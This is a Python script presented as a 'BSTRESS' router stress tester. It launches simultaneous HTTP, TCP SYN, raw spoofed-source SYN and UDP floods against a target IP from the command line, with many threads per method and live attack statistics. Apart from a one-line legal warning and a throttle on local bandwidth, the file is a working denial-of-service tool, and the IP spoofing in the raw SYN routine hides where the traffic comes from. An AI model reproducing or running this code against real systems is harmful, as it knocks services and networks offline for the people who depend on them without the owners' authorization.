import threading
import socket
import requests
import time
import psutil
import random
from collections import defaultdict
import argparse

class NetworkThrottler:
    def __init__(self, max_usage=0.9):
        self.max_usage = max_usage
        self.last_check = time.time()
        self.last_bytes_sent = 0
        self.last_bytes_recv = 0
        
    def check_bandwidth(self):
        """Check if we're exceeding bandwidth limits"""
        current_time = time.time()
        elapsed = current_time - self.last_check
        if elapsed < 0.1:  # Don't check too frequently
            return False
            
        net_io = psutil.net_io_counters()
        current_sent = net_io.bytes_sent
        current_recv = net_io.bytes_recv
        
        # Calculate current bandwidth usage
        sent_rate = (current_sent - self.last_bytes_sent) / elapsed
        recv_rate = (current_recv - self.last_bytes_recv) / elapsed
        
        # Get max possible bandwidth
        max_rate = psutil.net_if_stats()[list(psutil.net_if_stats().keys())[0]].speed * 125000  # Convert Mbps to bytes/s
        
        self.last_check = current_time
        self.last_bytes_sent = current_sent
        self.last_bytes_recv = current_recv
        
        if max_rate == 0:  # Couldn't determine max bandwidth
            return False
            
        total_usage = (sent_rate + recv_rate) / max_rate
        return total_usage > self.max_usage

class RouterStressTester:
    def __init__(self, target_ip, threads_per_attack=10):
        self.target_ip = target_ip
        self.threads_per_attack = threads_per_attack
        self.lock = threading.Lock()
        self.stop_flag = False
        self.throttler = NetworkThrottler(max_usage=0.9)  # 90% max network usage
        self.stats = defaultdict(int)
        self.stats.update({
            'start_time': time.time(),
            'syn_raw': 0,
            'throttled': 0
        })
        self.net_stats = psutil.net_io_counters()

    def http_flood(self):
        """Optimized HTTP flood with keep-alive and throttling"""
        session = requests.Session()
        url = f"http://{self.target_ip}"
        while not self.stop_flag:
            if self.throttler.check_bandwidth():
                with self.lock:
                    self.stats['throttled'] += 1
                time.sleep(0.1)
                continue
                
            try:
                session.get(url, timeout=2)
                with self.lock:
                    self.stats['http'] += 1
            except:
                with self.lock:
                    self.stats['errors'] += 1

    def syn_flood(self, port=80):
        """Standard SYN flood with throttling"""
        while not self.stop_flag:
            if self.throttler.check_bandwidth():
                with self.lock:
                    self.stats['throttled'] += 1
                time.sleep(0.1)
                continue
                
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    s.connect((self.target_ip, port))
                    with self.lock:
                        self.stats['syn'] += 1
            except:
                with self.lock:
                    self.stats['errors'] += 1

    def syn_flood_raw(self, port=80):
        """Advanced SYN flood with throttling"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            def craft_syn_packet():
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                ip_header = b'\x45\x00\x00\x3c'  # IP header
                ip_header += b'\x00\x00\x40\x00\x40\x06\x00\x00'  # More IP header
                ip_header += socket.inet_aton(src_ip)  # Source IP
                ip_header += socket.inet_aton(self.target_ip)  # Dest IP
                
                tcp_header = b'\x00\x50'  # Source port
                tcp_header += port.to_bytes(2, 'big')  # Dest port
                tcp_header += b'\x00\x00\x00\x00'  # Seq num
                tcp_header += b'\x00\x00\x00\x00'  # Ack num
                tcp_header += b'\x50\x02\xff\xff'  # Header + SYN
                tcp_header += b'\x00\x00\x00\x00'  # Window
                
                return ip_header + tcp_header
            
            while not self.stop_flag:
                if self.throttler.check_bandwidth():
                    with self.lock:
                        self.stats['throttled'] += 1
                    time.sleep(0.1)
                    continue
                    
                try:
                    s.sendto(craft_syn_packet(), (self.target_ip, 0))
                    with self.lock:
                        self.stats['syn_raw'] += 1
                except:
                    with self.lock:
                        self.stats['errors'] += 1
                        
        except PermissionError:
            print("[!] Raw SYN flood requires root. Falling back to TCP SYN.")
            self.syn_flood(port)

    def udp_flood(self, port=53):
        """UDP flood with throttling"""
        payload = b'X' * 1024  # Reduced from max to help with throttling
        while not self.stop_flag:
            if self.throttler.check_bandwidth():
                with self.lock:
                    self.stats['throttled'] += 1
                time.sleep(0.1)
                continue
                
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.sendto(payload, (self.target_ip, port))
                    with self.lock:
                        self.stats['udp'] += 1
            except:
                with self.lock:
                    self.stats['errors'] += 1

    def display_stats(self):
        """Display stats with network usage monitoring"""
        while not self.stop_flag:
            time.sleep(1)
            with self.lock:
                elapsed = time.time() - self.stats['start_time']
                current_net = psutil.net_io_counters()
                
                print("\033[H\033[J")  # Clear console
                print("=== BSTRESS Network Stress Tester ===")
                print(f"Target: {self.target_ip} | Runtime: {int(elapsed)}s")
                print(f"HTTP: {self.stats['http']} | SYN: {self.stats['syn']} | RAW SYN: {self.stats['syn_raw']} | UDP: {self.stats['udp']}")
                print(f"Errors: {self.stats['errors']} | Throttled: {self.stats['throttled']}")
                print(f"Network ↑: {(current_net.bytes_sent - self.net_stats.bytes_sent)/1024/1024:.1f}MB")
                print(f"Press CTRL+C to stop...")

    def run_test(self):
        """Start all attack threads"""
        attacks = [
            self.http_flood,
            self.syn_flood,
            self.syn_flood_raw,
            self.udp_flood
        ]
        threads = []
        
        for attack in attacks:
            for _ in range(min(self.threads_per_attack, 10)):  # Limit max threads
                t = threading.Thread(target=attack)
                t.daemon = True
                t.start()
                threads.append(t)

        threading.Thread(target=self.display_stats, daemon=True).start()

        try:
            while True: 
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop_flag = True
            print("\n[!] Stopping attack...")
            time.sleep(1)
            self._show_final_stats()

    def _show_final_stats(self):
        elapsed = time.time() - self.stats['start_time']
        total = sum(self.stats[k] for k in ['http','syn','syn_raw','udp'])
        print("\n=== FINAL REPORT ===")
        print(f"Runtime: {elapsed:.1f}s | Packets: {total}")
        print(f"HTTP: {self.stats['http']} | SYN: {self.stats['syn']} | RAW SYN: {self.stats['syn_raw']} | UDP: {self.stats['udp']}")
        print(f"Error Rate: {self.stats['errors']/total*100:.1f}%")
        print(f"Throttle Events: {self.stats['throttled']}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BSTRESS Network Load Tester")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Threads per attack type (1-10)")
    args = parser.parse_args()

    # Validate thread count
    args.threads = max(1, min(10, args.threads))  # Keep between 1-10

    print("\n[!] LEGAL WARNING: For authorized testing only!")
    confirm = input(f"Stress test {args.target} with {args.threads} threads? (y/n): ")
    if confirm.lower() == 'y':
        RouterStressTester(args.target, args.threads).run_test()